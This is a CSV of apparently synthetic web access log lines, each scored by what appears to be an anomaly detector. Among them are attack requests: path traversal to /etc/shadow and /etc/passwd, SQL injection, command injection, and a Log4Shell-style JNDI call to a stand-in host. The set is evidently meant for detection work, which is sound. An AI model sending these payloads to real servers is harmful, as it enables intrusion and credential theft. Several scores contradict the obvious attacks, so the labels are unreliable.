score_content,score_session,score_fused,score_fused_norm,line
2.1675755977630615,,2.1675755977630615,2.1675755977630615,85.174.231.199 - - [10/Jan/2025:12:42:40 +0000] "GET / HTTP/1.1" 200 11077 "https://www.google.com/" "curl/7.85.0"
24.851573944091797,,24.851573944091797,24.851573944091797,16.180.57.156 - - [10/Jan/2025:12:42:43 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 18030 "https://www.google.com/" "python-requests/2.31.0"
2.148284673690796,,2.148284673690796,2.148284673690796,224.128.153.3 - - [10/Jan/2025:12:42:44 +0000] "GET / HTTP/1.1" 200 951 "-" "curl/7.85.0"
70.52542114257812,,70.52542114257812,70.52542114257812,108.135.76.51 - - [10/Jan/2025:12:42:45 +0000] "HEAD /search?q=router HTTP/1.1" 200 12132 "https://twitter.com/" "dirb/2.22"
50.56242370605469,,50.56242370605469,50.56242370605469,103.175.220.181 - - [10/Jan/2025:12:42:45 +0000] "HEAD /login HTTP/1.1" 302 12585 "https://www.google.com/" "python-requests/2.31.0"
3.070352792739868,,3.070352792739868,3.070352792739868,249.48.109.77 - - [10/Jan/2025:12:42:47 +0000] "GET /index.html HTTP/1.1" 302 5013 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11057.3310546875,,11057.3310546875,11057.3310546875,202.234.67.100 - - [10/Jan/2025:12:42:48 +0000] "PUT /search?q=headphones HTTP/1.1" 502 306 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30149.158203125,,30149.158203125,30149.158203125,242.30.146.231 - - [10/Jan/2025:12:42:50 +0000] "DELETE /dashboard HTTP/1.1" 403 87 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.176121234893799,,2.176121234893799,2.176121234893799,103.74.123.253 - - [10/Jan/2025:12:42:52 +0000] "GET / HTTP/1.1" 200 13799 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9657070636749268,,1.9657070636749268,1.9657070636749268,232.79.29.194 - - [10/Jan/2025:12:42:52 +0000] "GET /login HTTP/1.1" 204 12899 "https://twitter.com/" "nikto/2.5.0"
71.7699203491211,,71.7699203491211,71.7699203491211,147.198.104.64 - - [10/Jan/2025:12:42:53 +0000] "OPTIONS /.git/config HTTP/1.1" 200 3230 "https://example.com/" "python-requests/2.31.0"
27.671117782592773,,27.671117782592773,27.671117782592773,74.69.106.89 - - [10/Jan/2025:12:42:56 +0000] "DELETE /contact HTTP/1.1" 204 8647 "https://www.google.com/" "sqlmap/1.7.2#stable"
103.236328125,,103.236328125,103.236328125,193.142.8.131 - - [10/Jan/2025:12:42:58 +0000] "TRACE /.git/config HTTP/1.1" 200 13429 "https://example.com/" "nikto/2.5.0"
30135.330078125,,30135.330078125,30135.330078125,194.111.26.143 - - [10/Jan/2025:12:43:01 +0000] "PUT /login HTTP/1.1" 403 1119 "-" "python-requests/2.31.0"
27.586193084716797,,27.586193084716797,27.586193084716797,159.83.223.8 - - [10/Jan/2025:12:43:03 +0000] "GET /api/product?id=123 HTTP/1.1" 304 1474 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
70.51322174072266,,70.51322174072266,70.51322174072266,153.84.163.205 - - [10/Jan/2025:12:43:03 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2200 "-" "curl/7.85.0"
0.31250059604644775,,0.31250059604644775,0.31250059604644775,139.238.144.94 - - [10/Jan/2025:12:43:05 +0000] "GET /index.html HTTP/1.1" 200 14746 "https://news.ycombinator.com/" "curl/7.85.0"
27.489776611328125,,27.489776611328125,27.489776611328125,185.243.223.239 - - [10/Jan/2025:12:43:05 +0000] "DELETE /server-status HTTP/1.1" 200 2280 "https://example.com/" "nikto/2.5.0"
30135.23828125,,30135.23828125,30135.23828125,245.129.43.208 - - [10/Jan/2025:12:43:08 +0000] "PUT /admin HTTP/1.1" 401 1440 "-" "dirb/2.22"
0.2060936540365219,,0.2060936540365219,0.2060936540365219,136.72.140.106 - - [10/Jan/2025:12:43:08 +0000] "GET /assets/app.css HTTP/1.1" 200 11914 "https://news.ycombinator.com/" "curl/7.85.0"
2.1656715869903564,,2.1656715869903564,2.1656715869903564,150.221.132.180 - - [10/Jan/2025:12:43:10 +0000] "GET / HTTP/1.1" 200 10502 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30216.955078125,,30216.955078125,30216.955078125,85.97.192.100 - - [10/Jan/2025:12:43:12 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 400 314 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.602148056030273,,27.602148056030273,27.602148056030273,131.9.246.182 - - [10/Jan/2025:12:43:13 +0000] "POST /search?q=camera HTTP/1.1" 200 10426 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.49211883544922,,73.49211883544922,73.49211883544922,241.51.187.84 - - [10/Jan/2025:12:43:14 +0000] "OPTIONS /about HTTP/1.1" 200 12844 "https://example.com/" "dirb/2.22"
4.807682514190674,,4.807682514190674,4.807682514190674,70.31.40.117 - - [10/Jan/2025:12:43:15 +0000] "POST /contact HTTP/1.1" 200 18602 "https://example.com/" "sqlmap/1.7.2#stable"
0.2503165006637573,,0.2503165006637573,0.2503165006637573,65.3.122.58 - - [10/Jan/2025:12:43:16 +0000] "GET /assets/app.js HTTP/1.1" 200 19801 "-" "curl/7.85.0"
127.72191619873047,,127.72191619873047,127.72191619873047,172.15.101.170 - - [10/Jan/2025:12:43:19 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1020 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.869072914123535,,4.869072914123535,4.869072914123535,39.219.232.235 - - [10/Jan/2025:12:43:22 +0000] "POST /login HTTP/1.1" 200 15771 "https://www.google.com/" "nikto/2.5.0"
27.743009567260742,,27.743009567260742,27.743009567260742,158.115.79.4 - - [10/Jan/2025:12:43:22 +0000] "DELETE /logout HTTP/1.1" 200 19474 "-" "python-requests/2.31.0"
50.46652603149414,,50.46652603149414,50.46652603149414,237.37.169.137 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 5161 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.519676208496094,,50.519676208496094,50.519676208496094,225.195.140.191 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=router HTTP/1.1" 200 15541 "https://twitter.com/" "dirb/2.22"
1.9801533222198486,,1.9801533222198486,1.9801533222198486,44.65.194.92 - - [10/Jan/2025:12:43:25 +0000] "GET /login HTTP/1.1" 200 15904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.21712827682495117,,0.21712827682495117,0.21712827682495117,199.43.84.35 - - [10/Jan/2025:12:43:26 +0000] "GET /assets/app.css HTTP/1.1" 200 15581 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.3590030670166,,30.3590030670166,30.3590030670166,25.225.152.95 - - [10/Jan/2025:12:43:26 +0000] "POST /search?q=camera HTTP/1.1" 301 5257 "https://news.ycombinator.com/" "curl/7.85.0"
30.420076370239258,,30.420076370239258,30.420076370239258,52.124.184.50 - - [10/Jan/2025:12:43:28 +0000] "POST /search?q=router HTTP/1.1" 304 5399 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.660091400146484,,47.660091400146484,47.660091400146484,154.22.209.76 - - [10/Jan/2025:12:43:30 +0000] "HEAD /api/products HTTP/1.1" 200 9096 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
45.8790283203125,,45.8790283203125,45.8790283203125,116.229.27.74 - - [10/Jan/2025:12:43:33 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 7799 "-" "sqlmap/1.7.2#stable"
76.16846466064453,,76.16846466064453,76.16846466064453,27.25.4.166 - - [10/Jan/2025:12:43:35 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 13709 "-" "dirb/2.22"
27.52019691467285,,27.52019691467285,27.52019691467285,229.189.205.222 - - [10/Jan/2025:12:43:35 +0000] "GET /search?q=laptop HTTP/1.1" 304 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.515356063842773,,27.515356063842773,27.515356063842773,151.100.109.71 - - [10/Jan/2025:12:43:38 +0000] "POST /search?q=headphones HTTP/1.1" 200 3959 "-" "Wget/1.21.2 (linux-gnu)"
70.50585174560547,,70.50585174560547,70.50585174560547,196.103.22.69 - - [10/Jan/2025:12:43:40 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 802 "https://news.ycombinator.com/" "dirb/2.22"
11.73964786529541,,11.73964786529541,11.73964786529541,187.117.72.197 - - [10/Jan/2025:12:43:40 +0000] "PUT /wp-login.php HTTP/1.1" 200 12746 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.697635650634766,,47.697635650634766,47.697635650634766,223.140.56.5 - - [10/Jan/2025:12:43:41 +0000] "HEAD /profile HTTP/1.1" 200 11514 "https://www.google.com/" "nikto/2.5.0"
96.23941040039062,,96.23941040039062,96.23941040039062,228.101.195.231 - - [10/Jan/2025:12:43:41 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 14195 "https://www.google.com/" "nikto/2.5.0"
24.645702362060547,,24.645702362060547,24.645702362060547,110.139.102.30 - - [10/Jan/2025:12:43:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 8856 "https://www.google.com/" "sqlmap/1.7.2#stable"
30.416845321655273,,30.416845321655273,30.416845321655273,82.130.141.86 - - [10/Jan/2025:12:43:43 +0000] "DELETE /dashboard HTTP/1.1" 301 18281 "https://example.com/" "python-requests/2.31.0"
13.329806327819824,,13.329806327819824,13.329806327819824,186.20.216.25 - - [10/Jan/2025:12:43:44 +0000] "PUT /api/products HTTP/1.1" 200 4711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
39.01320266723633,,39.01320266723633,39.01320266723633,90.78.128.20 - - [10/Jan/2025:12:43:44 +0000] "PUT /search?q=phone HTTP/1.1" 302 9010 "https://news.ycombinator.com/" "nikto/2.5.0"
30122.2421875,,30122.2421875,30122.2421875,97.11.118.91 - - [10/Jan/2025:12:43:46 +0000] "GET /assets/app.js HTTP/1.1" 401 22 "https://www.google.com/" "nikto/2.5.0"
30135.216796875,,30135.216796875,30135.216796875,145.95.152.152 - - [10/Jan/2025:12:43:47 +0000] "PUT /contact HTTP/1.1" 401 235 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.391239166259766,,50.391239166259766,50.391239166259766,180.45.108.174 - - [10/Jan/2025:12:43:47 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 8155 "https://twitter.com/" "curl/7.85.0"
104.89063262939453,,104.89063262939453,104.89063262939453,83.21.76.247 - - [10/Jan/2025:12:43:49 +0000] "TRACE /login HTTP/1.1" 200 3620 "https://www.google.com/" "dirb/2.22"
50.47761154174805,,50.47761154174805,50.47761154174805,185.105.221.166 - - [10/Jan/2025:12:43:51 +0000] "DELETE /search?q=camera HTTP/1.1" 200 1965 "https://news.ycombinator.com/" "python-requests/2.31.0"
130.47010803222656,,130.47010803222656,130.47010803222656,80.222.61.24 - - [10/Jan/2025:12:43:51 +0000] "TRACE /search?q=headphones HTTP/1.1" 304 13217 "https://news.ycombinator.com/" "nikto/2.5.0"
1.94061279296875,,1.94061279296875,1.94061279296875,64.18.84.143 - - [10/Jan/2025:12:43:51 +0000] "GET /login HTTP/1.1" 201 4547 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.805386543273926,,4.805386543273926,4.805386543273926,249.16.15.115 - - [10/Jan/2025:12:43:52 +0000] "POST /logout HTTP/1.1" 200 7060 "https://www.google.com/" "sqlmap/1.7.2#stable"
30191.599609375,,30191.599609375,30191.599609375,205.146.198.230 - - [10/Jan/2025:12:43:55 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 401 671 "https://example.com/" "nikto/2.5.0"
27.612699508666992,,27.612699508666992,27.612699508666992,59.239.224.4 - - [10/Jan/2025:12:43:56 +0000] "DELETE /dashboard HTTP/1.1" 200 8152 "-" "python-requests/2.31.0"
70.48075103759766,,70.48075103759766,70.48075103759766,188.13.34.202 - - [10/Jan/2025:12:43:59 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 4692 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.886426568031311,,1.886426568031311,1.886426568031311,87.192.169.24 - - [10/Jan/2025:12:44:01 +0000] "GET /contact HTTP/1.1" 200 655 "https://news.ycombinator.com/" "curl/7.85.0"
127.7225341796875,,127.7225341796875,127.7225341796875,8.208.134.149 - - [10/Jan/2025:12:44:04 +0000] "TRACE /search?q=phone HTTP/1.1" 200 19246 "https://twitter.com/" "curl/7.85.0"
96.25387573242188,,96.25387573242188,96.25387573242188,141.253.154.125 - - [10/Jan/2025:12:44:06 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 393 "https://example.com/" "sqlmap/1.7.2#stable"
13.456912994384766,,13.456912994384766,13.456912994384766,164.236.108.143 - - [10/Jan/2025:12:44:09 +0000] "PUT /about HTTP/1.1" 200 410 "https://example.com/" "sqlmap/1.7.2#stable"
47.73072814941406,,47.73072814941406,47.73072814941406,23.118.109.6 - - [10/Jan/2025:12:44:10 +0000] "HEAD /logout HTTP/1.1" 200 467 "https://twitter.com/" "sqlmap/1.7.2#stable"
47.76776123046875,,47.76776123046875,47.76776123046875,169.141.98.232 - - [10/Jan/2025:12:44:13 +0000] "HEAD /about HTTP/1.1" 200 11883 "-" "python-requests/2.31.0"
3.187068223953247,,3.187068223953247,3.187068223953247,236.61.7.83 - - [10/Jan/2025:12:44:13 +0000] "POST /.git/config HTTP/1.1" 200 19211 "-" "python-requests/2.31.0"
30146.720703125,,30146.720703125,30146.720703125,144.217.107.228 - - [10/Jan/2025:12:44:15 +0000] "GET /search?q=headphones HTTP/1.1" 403 1499 "https://twitter.com/" "curl/7.85.0"
27.690332412719727,,27.690332412719727,27.690332412719727,112.2.149.51 - - [10/Jan/2025:12:44:17 +0000] "DELETE /logout HTTP/1.1" 200 2670 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.52315902709961,,47.52315902709961,47.52315902709961,208.46.19.141 - - [10/Jan/2025:12:44:18 +0000] "HEAD /server-status HTTP/1.1" 200 9118 "https://news.ycombinator.com/" "nikto/2.5.0"
38.97285079956055,,38.97285079956055,38.97285079956055,181.106.253.248 - - [10/Jan/2025:12:44:21 +0000] "PUT /search?q=camera HTTP/1.1" 302 1735 "-" "Wget/1.21.2 (linux-gnu)"
50.551246643066406,,50.551246643066406,50.551246643066406,96.20.6.31 - - [10/Jan/2025:12:44:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 6147 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.944592237472534,,2.944592237472534,2.944592237472534,250.94.122.254 - - [10/Jan/2025:12:44:23 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 2962 "https://www.google.com/" "dirb/2.22"
27.591611862182617,,27.591611862182617,27.591611862182617,14.236.44.152 - - [10/Jan/2025:12:44:25 +0000] "POST /search?q=monitor HTTP/1.1" 200 12883 "https://news.ycombinator.com/" "curl/7.85.0"
30146.6796875,,30146.6796875,30146.6796875,17.80.217.35 - - [10/Jan/2025:12:44:28 +0000] "GET /search?q=camera HTTP/1.1" 400 1104 "https://example.com/" "nikto/2.5.0"
30123.705078125,,30123.705078125,30123.705078125,191.108.62.110 - - [10/Jan/2025:12:44:31 +0000] "GET /profile HTTP/1.1" 404 1147 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
96.25590515136719,,96.25590515136719,96.25590515136719,105.44.106.243 - - [10/Jan/2025:12:44:31 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7544 "-" "dirb/2.22"
7.495276927947998,,7.495276927947998,7.495276927947998,230.107.73.17 - - [10/Jan/2025:12:44:31 +0000] "POST /dashboard HTTP/1.1" 301 11507 "https://example.com/" "nikto/2.5.0"
104.82054901123047,,104.82054901123047,104.82054901123047,162.6.180.160 - - [10/Jan/2025:12:44:34 +0000] "TRACE /api/products HTTP/1.1" 200 11576 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.1743319034576416,,2.1743319034576416,2.1743319034576416,88.161.227.247 - - [10/Jan/2025:12:44:37 +0000] "GET / HTTP/1.1" 204 15089 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.7352180480957,,47.7352180480957,47.7352180480957,54.233.88.122 - - [10/Jan/2025:12:44:39 +0000] "HEAD /logout HTTP/1.1" 200 12759 "-" "Wget/1.21.2 (linux-gnu)"
36.22300338745117,,36.22300338745117,36.22300338745117,54.251.155.39 - - [10/Jan/2025:12:44:40 +0000] "PUT /search?q=camera HTTP/1.1" 200 18761 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.72807312011719,,127.72807312011719,127.72807312011719,68.52.19.123 - - [10/Jan/2025:12:44:43 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 7352 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.54469299316406,,70.54469299316406,70.54469299316406,116.163.87.138 - - [10/Jan/2025:12:44:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11750 "https://www.google.com/" "nikto/2.5.0"
24.724876403808594,,24.724876403808594,24.724876403808594,231.49.175.108 - - [10/Jan/2025:12:44:48 +0000] "GET /search?q=camera HTTP/1.1" 200 13527 "https://news.ycombinator.com/" "curl/7.85.0"
47.58116149902344,,47.58116149902344,47.58116149902344,204.26.26.69 - - [10/Jan/2025:12:44:50 +0000] "HEAD /phpmyadmin HTTP/1.1" 200 4245 "https://twitter.com/" "dirb/2.22"
104.85525512695312,,104.85525512695312,104.85525512695312,35.65.8.165 - - [10/Jan/2025:12:44:52 +0000] "TRACE /logout HTTP/1.1" 200 3580 "https://news.ycombinator.com/" "nikto/2.5.0"
30123.923828125,,30123.923828125,30123.923828125,148.193.168.150 - - [10/Jan/2025:12:44:55 +0000] "GET / HTTP/1.1" 403 1073 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.08392525464296341,,0.08392525464296341,0.08392525464296341,194.169.251.70 - - [10/Jan/2025:12:44:56 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 9678 "https://news.ycombinator.com/" "dirb/2.22"
6.152952194213867,,6.152952194213867,6.152952194213867,66.166.141.15 - - [10/Jan/2025:12:44:59 +0000] "POST /.env HTTP/1.1" 302 3875 "https://www.google.com/" "curl/7.85.0"
13.354074478149414,,13.354074478149414,13.354074478149414,113.12.122.49 - - [10/Jan/2025:12:45:00 +0000] "PUT /profile HTTP/1.1" 200 2962 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.29667663574219,,73.29667663574219,73.29667663574219,253.252.192.58 - - [10/Jan/2025:12:45:00 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 201 2223 "https://example.com/" "nikto/2.5.0"
50.550106048583984,,50.550106048583984,50.550106048583984,114.164.36.56 - - [10/Jan/2025:12:45:00 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 5838 "https://www.google.com/" "nikto/2.5.0"
2.192554235458374,,2.192554235458374,2.192554235458374,106.139.53.4 - - [10/Jan/2025:12:45:01 +0000] "GET / HTTP/1.1" 200 19782 "-" "dirb/2.22"
11117.4970703125,,11117.4970703125,11117.4970703125,2.83.158.23 - - [10/Jan/2025:12:45:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 500 712 "https://twitter.com/" "curl/7.85.0"
0.31104445457458496,,0.31104445457458496,0.31104445457458496,24.72.210.232 - - [10/Jan/2025:12:45:03 +0000] "GET /index.html HTTP/1.1" 200 14250 "https://www.google.com/" "nikto/2.5.0"
0.27274954319000244,,0.27274954319000244,0.27274954319000244,205.135.9.66 - - [10/Jan/2025:12:45:06 +0000] "GET /index.html HTTP/1.1" 200 2377 "-" "nikto/2.5.0"
27.773420333862305,,27.773420333862305,27.773420333862305,73.150.50.190 - - [10/Jan/2025:12:45:09 +0000] "DELETE /admin HTTP/1.1" 200 17583 "https://www.google.com/" "dirb/2.22"
2.1871113777160645,,2.1871113777160645,2.1871113777160645,207.149.148.245 - - [10/Jan/2025:12:45:12 +0000] "GET / HTTP/1.1" 201 18332 "-" "sqlmap/1.7.2#stable"
4.805953025817871,,4.805953025817871,4.805953025817871,150.75.188.155 - - [10/Jan/2025:12:45:15 +0000] "GET /admin HTTP/1.1" 304 13915 "https://example.com/" "nikto/2.5.0"
4.7421159744262695,,4.7421159744262695,4.7421159744262695,185.134.169.170 - - [10/Jan/2025:12:45:17 +0000] "POST /api/products HTTP/1.1" 200 7108 "https://twitter.com/" "dirb/2.22"
70.58941650390625,,70.58941650390625,70.58941650390625,190.73.115.197 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 11751 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30191.5,,30191.5,30191.5,148.180.173.84 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 403 308 "https://example.com/" "nikto/2.5.0"
47.751033782958984,,47.751033782958984,47.751033782958984,194.118.178.121 - - [10/Jan/2025:12:45:19 +0000] "HEAD /logout HTTP/1.1" 201 18958 "https://example.com/" "dirb/2.22"
47.787574768066406,,47.787574768066406,47.787574768066406,11.165.57.241 - - [10/Jan/2025:12:45:22 +0000] "HEAD /about HTTP/1.1" 200 18763 "https://example.com/" "curl/7.85.0"
71.65965270996094,,71.65965270996094,71.65965270996094,102.252.1.79 - - [10/Jan/2025:12:45:22 +0000] "OPTIONS /../../etc/passwd HTTP/1.1" 200 2257 "https://twitter.com/" "python-requests/2.31.0"
27.63768768310547,,27.63768768310547,27.63768768310547,127.253.232.16 - - [10/Jan/2025:12:45:24 +0000] "DELETE /api/products HTTP/1.1" 200 886 "https://twitter.com/" "curl/7.85.0"
127.7166519165039,,127.7166519165039,127.7166519165039,216.187.108.57 - - [10/Jan/2025:12:45:25 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1480 "https://example.com/" "python-requests/2.31.0"
36.13699722290039,,36.13699722290039,36.13699722290039,170.52.170.73 - - [10/Jan/2025:12:45:27 +0000] "PUT /search?q=headphones HTTP/1.1" 200 11041 "https://news.ycombinator.com/" "nikto/2.5.0"
96.33267211914062,,96.33267211914062,96.33267211914062,110.180.9.103 - - [10/Jan/2025:12:45:28 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 272 "https://twitter.com/" "python-requests/2.31.0"
3.0049092769622803,,3.0049092769622803,3.0049092769622803,213.221.106.74 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.js HTTP/1.1" 301 13874 "https://www.google.com/" "python-requests/2.31.0"
4.6014180183410645,,4.6014180183410645,4.6014180183410645,101.219.131.98 - - [10/Jan/2025:12:45:31 +0000] "GET /dashboard HTTP/1.1" 302 4364 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.0536317825317383,,3.0536317825317383,3.0536317825317383,28.159.13.47 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.css HTTP/1.1" 304 17430 "https://example.com/" "curl/7.85.0"
30.377174377441406,,30.377174377441406,30.377174377441406,86.141.189.216 - - [10/Jan/2025:12:45:34 +0000] "POST /search?q=laptop HTTP/1.1" 302 4753 "https://twitter.com/" "nikto/2.5.0"
70.61157989501953,,70.61157989501953,70.61157989501953,28.29.206.195 - - [10/Jan/2025:12:45:36 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 19477 "https://twitter.com/" "nikto/2.5.0"
96.2601547241211,,96.2601547241211,96.2601547241211,57.44.116.197 - - [10/Jan/2025:12:45:37 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15002 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.40682220458984,,73.40682220458984,73.40682220458984,36.254.100.209 - - [10/Jan/2025:12:45:40 +0000] "OPTIONS /contact HTTP/1.1" 201 8439 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.604065418243408,,4.604065418243408,4.604065418243408,103.130.218.78 - - [10/Jan/2025:12:45:43 +0000] "GET /dashboard HTTP/1.1" 301 10721 "https://twitter.com/" "curl/7.85.0"
24.58576011657715,,24.58576011657715,24.58576011657715,145.114.129.142 - - [10/Jan/2025:12:45:44 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3849 "https://example.com/" "curl/7.85.0"
1.8442978858947754,,1.8442978858947754,1.8442978858947754,51.63.234.193 - - [10/Jan/2025:12:45:44 +0000] "GET /api/products HTTP/1.1" 200 1119 "-" "dirb/2.22"
50.520751953125,,50.520751953125,50.520751953125,50.179.93.155 - - [10/Jan/2025:12:45:46 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 15919 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.28099822998047,,96.28099822998047,96.28099822998047,110.107.113.166 - - [10/Jan/2025:12:45:47 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 2062 "-" "Wget/1.21.2 (linux-gnu)"
27.61829948425293,,27.61829948425293,27.61829948425293,238.120.64.186 - - [10/Jan/2025:12:45:48 +0000] "POST /search?q=camera HTTP/1.1" 200 15666 "https://twitter.com/" "curl/7.85.0"
27.706829071044922,,27.706829071044922,27.706829071044922,251.196.29.30 - - [10/Jan/2025:12:45:50 +0000] "DELETE /profile HTTP/1.1" 200 18501 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.690467834472656,,50.690467834472656,50.690467834472656,64.108.76.61 - - [10/Jan/2025:12:45:51 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 11998 "https://twitter.com/" "sqlmap/1.7.2#stable"
